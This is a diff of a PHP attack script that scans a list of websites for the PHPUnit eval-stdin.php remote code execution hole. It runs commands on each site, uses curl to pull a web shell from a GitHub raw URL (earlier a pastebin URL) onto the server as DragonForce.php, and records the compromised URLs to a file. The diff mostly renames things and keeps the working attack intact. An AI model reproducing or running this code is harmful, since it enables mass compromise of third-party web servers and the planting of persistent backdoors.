@@ -1,8 +1,6 @@
 <?php
-#code by LittleJok3r
-#LOKONTOL
 error_reporting(0);
-function ngecek($kk){
+function check($kk){
         $data = "<?php system('ls')?>";
         $ch = curl_init();
         curl_setopt($ch, CURLOPT_URL, $kk."/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php");
@@ -22,7 +20,7 @@ function ngecek($kk){
         $hasil = curl_exec($ch);
         curl_close($ch);
           echo "System : ".$hasil;
-          $data = "<?php system('curl -s https://pastebin.com/raw/Z5BnpfcX -o OpsGanyang.php')?>";
+          $data = "<?php system('curl -s https://raw.githubusercontent.com/apidotmy/Uploaders/master/OpsGanyang.php -o DragonForce.php')?>";
           $ch = curl_init();
         curl_setopt($ch, CURLOPT_URL, $kk."/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php");
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
@@ -38,10 +36,10 @@ function ngecek($kk){
         curl_setopt($ch, CURLOPT_POST, 1);
         $hasil = curl_exec($ch);
         curl_close($ch);
-          if(preg_match('OpsGanyang.php', $hasil)){
-            echo "SHELL : ".$kk."/vendor/phpunit/phpunit/src/Util/PHP/OpsGanyang.php \n";
+          if(preg_match('DragonForce.php', $hasil)){
+            echo "SHELL : ".$kk."/vendor/phpunit/phpunit/src/Util/PHP/DragonForce.php \n";
             $save  = fopen("result.txt", 'w');
-            fwrite($save, $kk."/vendor/phpunit/phpunit/src/Util/PHP/OpsGanyang.php \n");
+            fwrite($save, $kk."/vendor/phpunit/phpunit/src/Util/PHP/DragonForce.php \n");
             fclose($save);
           } else {
             echo "CAN'T UPLOAD SHELL \n";
@@ -56,5 +54,5 @@ if($argv[1] == ''){
     echo "Usage: php ".$argv[0]." list.txt \n";
 } else {
 foreach ($k as $kk) {
-    ngecek($kk);
+    check($kk);
  } }
